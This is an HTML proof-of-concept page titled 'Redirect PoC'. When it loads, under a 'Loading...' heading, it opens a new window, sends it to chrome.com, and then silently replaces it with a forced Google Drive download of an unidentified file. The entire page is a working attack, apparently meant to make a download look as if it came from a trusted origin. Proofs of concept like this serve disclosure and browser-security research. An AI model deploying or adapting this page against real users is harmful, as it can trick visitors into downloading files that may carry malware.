<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirect PoC</title>
  <script>
    function chainRedirect(w, urls, index = 0) {
      if (index < urls.length) {
        console.log("Redirecting to:", urls[index]);
        w.location.replace(urls[index]);

        setTimeout(() => {
          chainRedirect(w, urls, index + 1);
        }, 400);
      }
    }

    function startRedirect() {
      let w = window.open("");

      setTimeout(() => {
        chainRedirect(w, [
          "https://chrome.com",
          "https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=5bdc824e-e9f2-4d16-b944-03088f37c506&at=AGN2oQ1FlDA48w-_QaRH1LvALFFA:1773898570212"
        ]);
      }, 300);
    }
  </script>
</head>

<body onload="startRedirect()">
  <h3>Loading...</h3>
</body>
</html>
